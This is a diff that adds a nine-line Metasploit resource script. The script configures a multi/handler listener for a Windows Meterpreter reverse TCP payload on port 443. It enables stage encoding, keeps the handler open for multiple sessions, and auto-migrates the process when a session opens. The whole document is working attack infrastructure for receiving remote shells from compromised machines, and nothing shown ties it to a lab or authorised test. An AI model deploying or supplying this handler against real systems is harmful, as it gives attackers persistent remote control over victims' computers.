@@ -1,0 +1,9 @@
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0 
+set LPORT 443
+set EnableStageEncoding true
+set ExitOnSession false
+set InitialAutoRunScript migrate -f
+exploit -j
+
